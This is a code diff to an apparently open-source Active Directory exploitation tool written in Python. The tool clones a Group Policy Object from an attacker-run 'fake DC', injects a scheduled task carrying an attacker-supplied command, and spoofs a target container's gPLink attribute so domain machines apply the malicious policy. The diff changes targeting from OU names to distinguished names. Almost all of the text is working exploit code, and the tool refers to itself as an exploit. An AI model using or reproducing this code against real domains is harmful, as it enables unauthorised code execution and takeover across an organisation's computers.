@@ -5,13 +5,12 @@ import socket
 import logging
 import traceback
 import configparser
-import dns.resolver
 
 import _thread                      as thread
 import helpers.forwarder            as forwarder
 
 from time                           import sleep
-from ldap3                          import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES
+from ldap3                          import Server, Connection, NTLM, SUBTREE, BASE, ALL_ATTRIBUTES
 from impacket.ntlm                  import compute_lmhash, compute_nthash
 from typing_extensions              import Annotated
 from helpers.smb_utils              import get_smb_connection, download_initial_gpo, upload_directory_to_share, recursive_smb_delete
@@ -79,12 +78,12 @@ def main(
     ### ===================================== ###
     ### Performing arguments coherence checks ###
     ### ===================================== ###
-    try:    
-        options = configparser.ConfigParser()
+    try:
+        options = configparser.ConfigParser(interpolation=None)
         options.read(config)
 
         # These arguments are required - we can't perform the exploit without them
-        required_options = {"GENERAL": ["domain", "ou", "username", "attacker_ip", "command", "target_type"],
+        required_options = {"GENERAL": ["domain", "containerDN", "username", "attacker_ip", "command", "target_type"],
                             "LDAP": ["ldap_ip", "ldap_username", "ldap_password", "gpo_id", "ldap_machine_name", "ldap_machine_password"],
                             "SMB": ["smb_mode"]}
         for section in required_options.keys():
@@ -95,7 +94,7 @@ def main(
         
         # Assigning required options to variables
         domain = options["GENERAL"]["domain"]
-        ou = options["GENERAL"]["ou"]
+        containerDN = options["GENERAL"]["containerDN"]
         username = options["GENERAL"]["username"]
         attacker_ip = options["GENERAL"]["attacker_ip"]
         command = options["GENERAL"]["command"]
@@ -338,8 +337,8 @@ def main(
     ### Spoofing the gPCFileSysPath attribute of the cloned GPO, and update its extensions ###
     ### ================================================================================== ###
     logger.warning(f"\n\n{bcolors.BOLD}=== PERFORMING GPO OPERATIONS (CLONING, INJECTING SCHEDULED TASK, UPLOADING TO SMB SERVER IF NEEDED) ==={bcolors.ENDC}")
-    save_file_name = init_save_file(ou)
-    logger.info(f"[*] The save file for current exploit run is {save_file_name}")
+    save_file_name = init_save_file(containerDN)
+    logger.warning(f"[*] The save file for current exploit run is {save_file_name}")
 
     logger.warning(f"[*] Cloning GPO {gpo_id} from fakedc {ldap_ip}.")
     try:
@@ -441,56 +440,39 @@ def main(
         clean(ldap_session, ldap_server_session, save_file_name)
         sys.exit(1)
 
-    logger.warning(f"[*] Searching the target OU '{ou}'.")
-    search_filter = f'(ou={ou})'
-    attributes = [ALL_ATTRIBUTES]
-    ldap_session.search(domain_dn, search_filter, SUBTREE, attributes=attributes)
-    ldap_entries = len(ldap_session.entries)
-    if ldap_entries == 1:
-        ou_dn = ldap_session.entries[0].entry_dn
-        logger.warning(f"{bcolors.OKGREEN}[+] Organizational unit found - {ou_dn}.{bcolors.ENDC}")
-    elif ldap_entries >= 2:
-        logger.warning(f"{bcolors.OKBLUE}[+] Several OUs matching this name have been found.{bcolors.ENDC}")
-        numEntry = 0
-        for entry in ldap_session.entries:
-            logger.warning(f"{bcolors.OKBLUE}[+] {numEntry+1} :  {entry.entry_dn}.{bcolors.ENDC}")
-            numEntry+=1
-        targetEntry = input(f"{bcolors.OKBLUE}[+] Select which OU you want to target : {bcolors.ENDC}")
-        try: 
-            targetEntry = int(targetEntry)
-            if(targetEntry > ldap_entries):
-                raise Exception
-        except:
-            logger.critical(f"{bcolors.FAIL}[!] Failed to select target OU.{bcolors.ENDC}")
+    logger.warning(f"[*] Searching the target container '{containerDN}'.")
+    try:
+        ldap_session.search(containerDN, "(objectClass=*)", BASE, attributes=[ALL_ATTRIBUTES])
+        ldap_entries = len(ldap_session.entries)
+        if ldap_entries == 1:
+            containerDN = ldap_session.entries[0].entry_dn
+            logger.warning(f"{bcolors.OKGREEN}[+] Container found - {containerDN}.{bcolors.ENDC}")
+        else:
+            logger.error(f"{bcolors.FAIL}[!] Could not find container with Distinguished Name {containerDN}.{bcolors.ENDC}")
             clean(ldap_session, ldap_server_session, save_file_name)
             sys.exit(1)
-        
-        ou_dn = ldap_session.entries[targetEntry-1].entry_dn
-        logger.warning(f"{bcolors.OKGREEN}[+] The OU has been successfully targeted. - {ou_dn}.{bcolors.ENDC}") 
-
-    else:
-        logger.error(f"{bcolors.FAIL}[!] Could not find Organizational Unit with name {ou}.{bcolors.ENDC}")
+    except:
+        print(traceback.print_exc())
+        logger.critical(f"{bcolors.FAIL}[!] Something went wrong while searching for the target container.{bcolors.ENDC}")
         clean(ldap_session, ldap_server_session, save_file_name)
         sys.exit(1)
-    
-    logger.warning(f"[*] Retrieving the initial gPLink value to prepare for cleaning.")
 
     try:
         spoofed_gPLink = f"[LDAP://cn={{{gpo_id}}},cn=policies,cn=system,{ldap_domain_dn};0]"
-        initial_gPLink = get_attribute(ldap_session, ou_dn, "gPLink")
+        initial_gPLink = get_attribute(ldap_session, containerDN, "gPLink")
         logger.warning(f"[*] Initial gPLink is {initial_gPLink}.")
         if str(initial_gPLink) != '[]':
             spoofed_gPLink = str(initial_gPLink) + spoofed_gPLink
         logger.warning(f"[*] Spoofing gPLink to {spoofed_gPLink}")
-        result = modify_attribute(ldap_session, ou_dn, 'gPLink', spoofed_gPLink)
+        result = modify_attribute(ldap_session, containerDN, 'gPLink', spoofed_gPLink)
         if result is not True: raise Exception
     except:
         print(traceback.print_exc())
         logger.critical(f"{bcolors.FAIL}[!] Failed to modify the gPLink attribute of the target OU with provided user.{bcolors.ENDC}")
         clean(ldap_session, ldap_server_session, save_file_name)
         sys.exit(1)
-    save_attribute_value("gPLink", initial_gPLink, save_file_name, "domain", ou_dn)
-    logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed gPLink for OU {ou_dn}{bcolors.ENDC}")
+    save_attribute_value("gPLink", initial_gPLink, save_file_name, "domain", containerDN)
+    logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed gPLink for container {containerDN}{bcolors.ENDC}")
 
 
     
